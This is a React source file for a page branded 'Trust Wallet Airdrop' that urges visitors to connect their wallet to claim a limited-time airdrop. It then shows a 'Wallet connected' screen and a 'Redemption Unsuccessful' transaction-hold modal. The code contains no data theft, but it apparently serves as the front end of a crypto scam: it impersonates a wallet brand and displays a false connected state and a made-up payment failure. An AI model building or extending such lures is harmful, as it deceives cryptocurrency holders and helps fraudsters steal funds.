import { useState } from 'react'
import trustShield from './assets/trust-shield.png'
import './App.css'

function App() {
  const [view, setView] = useState('landing')
  const [showRedeemModal, setShowRedeemModal] = useState(false)

  return (
    <>
      {view === 'landing' ? (
        <LandingPage onConnect={() => setView('redeem')} />
      ) : (
        <RedeemPage
          onBack={() => setView('landing')}
          onRedeem={() => setShowRedeemModal(true)}
        />
      )}

      {showRedeemModal && (
        <RedemptionModal onClose={() => setShowRedeemModal(false)} />
      )}
    </>
  )
}

function LandingPage({ onConnect }) {
  return (
    <main className="landing-page">
      <div className="landing-stage" aria-label="Trust Wallet airdrop">
        <span className="landing-cursor landing-cursor-top" aria-hidden="true" />
        <span className="landing-cursor landing-cursor-side" aria-hidden="true" />

        <div className="landing-orbit" aria-hidden="true">
          <span className="landing-orbit-ring" />
          <img className="landing-shield landing-shield-primary" src={trustShield} alt="" />
        </div>

        <img className="landing-shield landing-shield-small" src={trustShield} alt="" />
        <img className="landing-shield landing-shield-tiny" src={trustShield} alt="" />

        <section className="landing-copy">
          <p>Limited time event.</p>
          <h1>Trust Wallet Airdrop</h1>
          <span>
            Our airdrop campaign is now live! Connect your wallet below to check
            your eligibility.
          </span>
          <button type="button" onClick={onConnect}>
            Connect Wallet
          </button>
        </section>

        <div className="landing-next" aria-hidden="true">↓</div>
      </div>
    </main>
  )
}

function RedeemPage({ onBack, onRedeem }) {
  return (
    <main className="redeem-page">
      <section className="redeem-panel" aria-labelledby="redeem-title">
        <header className="redeem-header">
          <button className="back-button" type="button" onClick={onBack} aria-label="Back">
            ←
          </button>
          <img src={trustShield} alt="" />
        </header>

        <div className="redeem-copy">
          <p>Wallet connected</p>
          <h1 id="redeem-title">Redeem Airdrop</h1>
          <span>
            Confirm your connected wallet eligibility to continue with the
            redemption request.
          </span>
        </div>

        <div className="wallet-summary">
          <span>Wallet</span>
          <strong>Trust Wallet</strong>
          <small>Connected for eligibility check</small>
        </div>

        <button className="redeem-button" type="button" onClick={onRedeem}>
          Redeem
        </button>
      </section>
    </main>
  )
}

function RedemptionModal({ onClose }) {
  return (
    <section className="modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="modal-title">
      <div className="redemption-modal">
        <p className="modal-note">Note....</p>
        <p className="modal-hold">{'{Transaction hold declined}'}</p>
        <div className="modal-x" aria-hidden="true" />
        <h2 id="modal-title">Redemption Unsuccessful</h2>
        <p className="modal-message">
          This payment can not be processed now. Please check out the time of
          your payment and try again.
        </p>
        <p className="modal-status">*****[Receiver Status]*****</p>
        <button type="button" onClick={onClose}>
          Done
        </button>
      </div>
    </section>
  )
}

export default App
